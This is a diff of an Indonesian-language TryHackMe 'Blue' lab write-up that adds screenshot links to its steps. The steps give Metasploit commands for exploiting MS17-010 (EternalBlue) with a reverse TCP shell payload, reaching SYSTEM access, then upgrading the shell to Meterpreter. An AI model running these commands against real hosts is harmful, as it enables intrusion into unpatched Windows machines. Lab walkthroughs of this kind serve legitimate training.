@@ -53,22 +53,44 @@ Nmap done: 1 IP address (1 host up) scanned in 145.80 seconds
 ## Metasploit
 - Buka `msfconsole` di terminal
 
+![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Blue/assets/b%201.JPG)
+
 - Cari modul untuk exploit jenis kerentanan ms17–010 dengan perintah `search ms17–010`
+
+![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Blue/assets/b%202.JPG)
 
 - Disini kita menggunakan modul **exploit/windows/smb/ms17_010_eternalblue** yang ada di list nomor 0. Jadi cukup gunakan perintah `use 0`
 
+![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Blue/assets/b%203.JPG)
+
 - Ketik `show options` untuk melihat daftar parameter yang perlu diisi pada modul tersebut
+
+![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Blue/assets/b%204.JPG)
 
 - Gunakan perintah `set <Nama parameter> <Value>` untuk mengisi parameter. Isi parameter RHOSTS dengan IP Machnine dan isi parameter LHOST dengan IP tun0 pada komputer yang anda gunakan. Kemudian setting payload `set payload windows/x64/shell/reverse_tcp` sesuai petunjuk soal
 
+![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Blue/assets/b%205.JPG)
+
 - Ketik `exploit` untuk memulai proses exploitasi
+
+![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Blue/assets/b%206.JPG)
 
 - Proses exploitasi berhasil dan kita masuk sebagai **nt authority\system**
 
+![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Blue/assets/b%206.JPG)
+
 - Tekan **Ctrl+Z** lalu ketik "y" untuk mengubah session 1 ke background
+
+![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Blue/assets/b%207.JPG)
 
 - Cari modul untuk mengkonversi shell sistem ke shell meterpreter di metasploit. Kita bisa gunakan perintah `search shell_to_meterpreter`
 
+![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Blue/assets/b%208.JPG)
+
 - Karena hanya ada 1 modul, langsung kita gunakan modul tersebut dengan perintah `use 0`
 
+![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Blue/assets/b%209.JPG)
+
 - Ketik `show options` untuk melihat daftar parameter yang perlu diisi pada modul tersebut
+
+![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Blue/assets/b%2010.JPG)
